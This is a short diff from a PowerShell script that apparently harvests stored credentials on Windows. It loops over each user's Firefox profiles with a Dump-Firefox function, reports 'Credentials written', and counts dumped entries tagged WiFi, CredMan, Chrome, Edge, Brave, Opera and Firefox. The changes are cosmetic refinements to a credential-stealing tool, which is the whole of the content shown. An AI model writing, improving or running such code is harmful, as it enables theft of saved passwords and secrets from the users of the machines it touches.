-    Get-ChildItem "$($u.FullName)\AppData\Roaming\Mozilla\Firefox\Profiles" -Directory -Force -EA 0 | ForEach-Object {
-        Dump-Firefox $_.FullName
-    }
+    Get-ChildItem ($u.FullName + '\AppData\Roaming\Mozilla\Firefox\Profiles') -Directory -Force -EA 0 |
+        ForEach-Object { Dump-Firefox $_.FullName }
 }
 
 Write-Host "[+] Credentials written to $out"
-Get-Content $out | Where-Object { $_ -notmatch '^\[' } | Measure-Object | % { Write-Host "[+] $($_.Count) entries" }
+Get-Content $out -EA 0 | Where-Object { $_ -match '^\[(WiFi|CredMan|Chrome|Edge|Brave|Opera|Firefox)\]' } |
+    Measure-Object | ForEach-Object { Write-Host "[+] $($_.Count) credential lines found" }
